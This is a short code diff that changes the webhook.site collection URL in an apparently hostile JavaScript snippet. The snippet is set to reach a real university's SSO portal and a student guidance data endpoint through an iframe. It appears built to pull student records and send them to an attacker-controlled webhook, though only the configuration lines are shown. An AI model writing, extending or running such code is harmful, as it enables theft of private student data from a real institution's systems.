@@ -1,6 +1,6 @@
 (async () => {
     // === 設定 ===
-    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
+    const webhook = "https://webhook.site/27f621f1-be96-441d-b9d6-41fa8f6f788e";
     const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
     // 假設這是相對於 iframe 當前域名的路徑
     const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
